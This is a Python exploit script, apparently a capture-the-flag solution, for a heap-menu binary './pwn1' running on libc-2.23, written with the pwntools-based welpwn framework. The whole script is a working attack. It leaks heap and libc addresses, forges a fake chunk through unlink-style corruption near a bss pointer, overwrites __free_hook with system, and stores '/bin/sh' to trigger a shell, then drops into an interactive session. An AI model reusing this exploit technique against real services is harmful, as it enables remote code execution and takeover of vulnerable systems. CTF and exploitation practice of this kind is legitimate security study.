#https://github.com/matrix1001/welpwn

from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

if __name__ == '__main__':        
    context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
    context.log_level = 'debug'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))

    debugg = 1
    logg = 1

    ctx.binary = './pwn1'
    ctx.remote_libc = './libc-2.23.so'
    
    ctx.debug_remote_libc = False # True for debugging remote libc, false for local.

    #ctx.breakpoints = [0x401131,0x40114d,0x40122B]
    ctx.symbols = {'pool':0x605380}
    #ctx.debug()
    if debugg:
    	rs()
    else:
        ctx.remote = ('1.1.1.1', 1111)
        rs(method = 'remote')
    if logg:
	    context.log_level = 'debug'
    # rs('remote') # uncomment this for exploiting remote target

    libc = ctx.libc # ELF object of the corresponding libc.
    
    def Choice(num):
    	sla('>>',num)
    def Add(content):
    	Choice(1)
    	sla('num:',content)
    def Edit_target(flag='n',recv='n',content=None,size=0):
    	res = None
    	target_heap_addr = None
    	if recv == 'y':
    	    ru(':')
    	    res = int(r(size))
    	    #log.success('targer_addr:%s'%target_heap_addr)
    	sla('Edit (y/n):',flag)
    	#res = None
    	if flag == 'y':	
    		sleep(0.1)
    		sl(content)
    	return res
    def Clear():
    	Choice(3)
    def Show():
    	Choice(2)

    bss_addr = 0x605380

    Add(123)
    Add(123)
    Show()
    heap_addr = Edit_target('n','y',size = 8)
    for i in range(5):
    	Edit_target()
    for i in range(7):
    	Add(123)

    Clear()
    Add(123)
    Show()
    Edit_target()
    leak_addr = Edit_target('n','y',size=15)
    #dbg()
    log.success('heap_addr:%s'%hex(heap_addr))
    log.success('leak_addr:%s'%hex(leak_addr-0x6cdb78))
    libc_base = leak_addr-0x6cdb78
    free_hook = libc_base + 0x6cf7a8
    system  = libc_base + 0x34e3a0
    for i in range(3):
        Edit_target()
    #Show()
    #Add(123)
    #Add(123)
    Clear()
    for i in range(17):
    	Add(0x21)
    Clear()
    
    for i in range(4):
    	Add(0x20)
    Add(0x20)
    for i in range(3):
    	Add(0x20)
    #dbg()
    #raw_input()
    Show()
    for i in range(8):
    	Edit_target()
    Edit_target('y','n',-0x10)
    Edit_target('y','n',0x90)
    Edit_target('y','n',0)
    Edit_target('y','n',0x21)
    Edit_target('y','n',0x605398-0x18)
    Edit_target('y','n',0x605398-0x10)
    for i in range(4):
    	Edit_target()
    for i in range(7):
    	Add(0x20)
    #raw_input()
    Show()
    #dbg()
    #raw_input()
    Edit_target('y','n',free_hook - 8)
    Edit_target('y','n',free_hook + 8)
    Edit_target('y','n',0)
    Edit_target('y','n',0x605398)
    Edit_target('y','n',0x6053A8)
    dbg()
    raw_input()
    Show()
    Edit_target('y','n',0x68732F6E69622F)  #/bin/sh
    Edit_target('y','n',system)
    Clear()
    irt()
    #dbg()
    #raw_input()
    #dbg()
    #raw_input()
    


    #dbg()
    #raw_input()
    #Show()
    #for i in range(0,5):
    	#Edit('n')
    #Show()
    #heap_addr = Edit_target('y','y')
    #for i in range(5):
    	#Edit_target()
    #for i in range(7):
    	#Add(0x31)
    
    #heap_addr = hex(int(heap_addr))
    #Edit('y',bss_addr)
    #log.success('heap_addr:%s'%heap_addr)
    #dbg()
    #raw_input()
    #for i in range(4):
    	#Edit('n')
    #dbg()
    #raw_input()
    #Clear()

    irt()
    # ipy() # if you have ipython, you can use this to check variables.



